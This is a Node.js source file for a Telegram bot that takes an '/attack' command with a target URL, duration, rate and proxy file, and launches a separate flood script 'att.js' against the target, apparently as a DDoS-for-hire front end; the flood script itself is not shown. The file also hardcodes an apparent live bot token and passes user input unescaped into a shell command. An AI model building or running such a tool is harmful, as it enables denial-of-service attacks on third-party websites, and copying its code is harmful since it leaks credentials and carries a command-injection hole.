const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Telegram bot token
const token = '6744405305:AAFoVj8XZhrej-ozEsVMLp7JJ3mbABSAXT0';
const bot = new TelegramBot(token, { polling: true });

// Function to check if a string is a valid URL
function isValidURL(url) {
    try {
        new URL(url);
        return true;
    } catch (error) {
        return false;
    }
}

bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');
    const target = args[0];
    const time = parseInt(args[1]);
    const numWords = args[2] || 100;
    const proxyFile = args[4] || 'proxy.txt';

    // Validate arguments
    if (!isValidURL(target)) {
        bot.sendMessage(chatId, 'Please provide a valid URL.Also Read Usage: /attack www.example.com 100');
        return;
    }
    if (isNaN(time) || time < 60 || time > 1000000) {
        bot.sendMessage(chatId, 'Time must be between 60 and 1000000');
        return;
    }

    // Run command and send success message
    const command = `node att.js ${target} ${time} ${numWords}  ${proxyFile}`;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `ATTACK SUCCESSFULLY END`);
        } else {
            bot.sendMessage(chatId, '😈 ATTACK START 😈');
        }
    });

    // Start countdown timer
    bot.sendMessage(chatId, 'Countdown: 30 seconds');
    setTimeout(() => {
        bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
    }, 30000);
});
